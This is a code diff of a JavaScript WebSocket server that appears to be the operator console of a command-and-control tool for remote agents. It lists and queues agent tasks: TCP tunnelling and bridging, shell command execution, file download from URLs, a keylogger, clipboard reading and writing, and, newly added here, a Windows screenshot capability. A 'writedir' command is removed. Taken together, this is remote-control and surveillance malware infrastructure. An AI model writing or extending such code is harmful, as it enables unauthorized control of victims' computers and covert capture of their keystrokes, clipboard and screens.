@@ -88,8 +88,7 @@ export const setupWS = (httpServer) => {
       "tunnel <lhost>:<lport> <rhost>:<rport>": "Start a TCP tunnel",
       "bridge <host1>:<port1> <host2>:<port2>": "Start a TCP bridge b/w 2 servers",
       "system <cmd>": "Run a shell command",
-      "writedir <dir>": "Change agent's write directory",
-      "webload <url> <file>": "Download a file from a URL"
+      "webload <url> <file>": "Download a file from a URL",
     }
 
     /**
@@ -127,6 +126,8 @@ export const setupWS = (httpServer) => {
               agentHelp["keymon <secs>"] = "Run a keylogger for given seconds";
               agentHelp["clipread"] = "Get text from clipboard";
               agentHelp["clipwrite <text>"] =  "Write text to clipboard";
+              if (agent.os === "windows")
+                agentHelp["screenshot"] = "Take a screenshot";
             }
             let cmds = Object.keys(agentHelp).sort();
             let maxLen = 0;
@@ -161,11 +162,6 @@ export const setupWS = (httpServer) => {
             let filename = input.substr(9).trim();
             taskModel.createTask(username, {
               agentID, taskType: "download", data: {file: filename}
-            });
-          }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
-            let dir = input.substr(9).trim();
-            taskModel.createTask(username, {
-              agentID, taskType: "writedir", data: {dir}
             });
           }else if (input.startsWith("keymon ")){ // Start a keylogger.
             let duration = parseInt(input.substr(7).trim());
@@ -266,6 +262,10 @@ export const setupWS = (httpServer) => {
             let text = input.substr(10)
             taskModel.createTask(username, {
               agentID, taskType: "clipwrite", data: {text}
+            });
+          }else if (input === "screenshot"){
+            taskModel.createTask(username, {
+              agentID, taskType: "screenshot"
             });
           }else if (input === "abort"){
             taskModel.createTask(username, {
